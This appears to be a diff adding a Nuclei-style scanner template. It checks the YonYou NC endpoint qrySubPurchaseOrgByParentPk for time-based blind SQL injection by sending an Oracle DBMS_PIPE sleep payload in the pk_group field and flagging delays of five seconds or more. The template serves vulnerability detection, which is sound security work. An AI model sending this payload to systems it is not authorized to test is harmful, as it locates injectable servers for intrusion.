@@ -1,0 +1,27 @@
+id: YonYouNC-qrySubPurchaseOrgByParentPk-sqlInjection
+
+info:
+  name: YonYouNC-qrySubPurchaseOrgByParentPk-sqlInjection
+  author: iSee857
+  severity: high
+  description: YonYouNC-qrySubPurchaseOrgByParentPk-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /ebvp/register/qrySubPurchaseOrgByParentPk HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/x-www-form-urlencoded
+
+        pk_group=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) --
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
